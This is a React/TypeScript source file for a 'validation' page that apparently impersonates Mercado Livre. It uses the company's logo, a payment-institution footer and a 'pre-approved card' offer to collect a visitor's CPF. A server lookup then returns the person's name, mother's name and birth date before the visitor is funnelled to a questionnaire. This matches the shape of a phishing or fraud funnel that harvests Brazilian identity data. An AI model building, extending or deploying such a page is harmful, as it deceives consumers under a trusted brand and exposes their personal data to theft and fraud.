import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";
import { consultarCPF } from "@/lib/cpf.functions";

export const Route = createFileRoute("/validacao")({
  head: () => ({
    meta: [
      { title: "Validação - Preencha seus dados" },
      { name: "description", content: "Preencha seu CPF para continuar o cadastro do cartão pré-aprovado." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Validacao,
});

function formatCPF(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  return d
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function formatDate(iso: string) {
  // "1990-01-01" -> "01/01/1990"
  if (!iso) return "-";
  const m = iso.match(/^(\d{4})-(\d{2})-(\d{2})/);
  if (!m) return iso;
  return `${m[3]}/${m[2]}/${m[1]}`;
}

type Screen = "form" | "loading" | "success";
type CPFData = {
  cpf: string;
  nome: string;
  mae: string;
  nascimento: string;
};

function Validacao() {
  const navigate = useNavigate();
  const consultar = useServerFn(consultarCPF);
  const [cpf, setCpf] = useState("");
  const [screen, setScreen] = useState<Screen>("form");
  const [data, setData] = useState<CPFData | null>(null);
  const [error, setError] = useState("");

  const handleContinue = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length !== 11) {
      setError("Digite um CPF válido com 11 dígitos");
      return;
    }
    setError("");
    setScreen("loading");
    try {
      const res = await consultar({ data: { cpf: digits } });
      if (!res.ok) {
        setError(res.error);
        setScreen("form");
        return;
      }
      setData(res.data);
      if (typeof window !== "undefined") {
        sessionStorage.setItem("nomeTitular", res.data.nome);
      }
      setScreen("success");
    } catch (e) {
      console.error(e);
      setError("Erro ao consultar CPF. Tente novamente.");
      setScreen("form");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      {/* Header */}
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={1} />

      {/* Decorations */}
      <div className="absolute top-40 -left-20 w-64 h-64 rounded-full bg-white/40 pointer-events-none" />
      <div className="absolute top-32 -right-24 w-80 h-80 rounded-full bg-white/40 pointer-events-none" />
      <div className="absolute bottom-32 left-1/3 w-48 h-48 rounded-full bg-white/40 pointer-events-none" />

      {/* Content */}
      <main className="flex-1 flex items-start justify-center px-4 py-10 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6">
          {screen === "form" && (
            <>
              <h1 className="text-xl font-semibold text-gray-800 mb-6">
                Preencha seus dados para cadastro
              </h1>
              <label className="block text-sm font-medium text-gray-700 mb-2" htmlFor="cpf">
                CPF
              </label>
              <input
                id="cpf"
                type="tel"
                inputMode="numeric"
                placeholder="000.000.000-00"
                value={cpf}
                onChange={(e) => setCpf(formatCPF(e.target.value))}
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-[#FFE600] focus:border-transparent"
              />
              {error && <p className="text-sm text-red-600 mt-2">{error}</p>}
              <button
                onClick={handleContinue}
                className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md mt-6 transition-all"
              >
                Continuar
              </button>
            </>
          )}

          {screen === "loading" && (
            <div className="flex flex-col items-center py-6">
              <div className="w-14 h-14 border-4 border-gray-200 border-t-[#3483FA] rounded-full animate-spin mb-6" />
              <h1 className="text-xl font-semibold text-gray-800 text-center">
                Estamos procurando seus dados
              </h1>
            </div>
          )}

          {screen === "success" && data && (
            <>
              <div className="flex flex-col items-center mb-6">
                <div className="w-14 h-14 rounded-full bg-[#FFE600] flex items-center justify-center mb-3">
                  <i className="fas fa-check text-white text-2xl" />
                </div>
                <div className="text-lg font-semibold text-gray-900">
                  Dados encontrados com sucesso!
                </div>
              </div>
              <div className="bg-gray-50 rounded-lg p-4 mb-6 space-y-3">
                <div className="flex justify-between text-sm gap-3">
                  <span className="text-gray-600 shrink-0">Nome:</span>
                  <span className="font-semibold text-gray-800 text-right">{data.nome}</span>
                </div>
                <div className="flex justify-between text-sm gap-3">
                  <span className="text-gray-600 shrink-0">Data de Nascimento:</span>
                  <span className="font-semibold text-gray-800 text-right">{formatDate(data.nascimento)}</span>
                </div>
                <div className="flex justify-between text-sm gap-3">

                  <span className="text-gray-600 shrink-0">CPF:</span>
                  <span className="font-semibold text-gray-800 text-right">{cpf}</span>
                </div>
              </div>
              <button
                onClick={() => navigate({ to: "/questionario" })}
                className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md transition-all"
              >
                Continuar
              </button>
            </>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
          <a href="#" className="text-gray-900">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
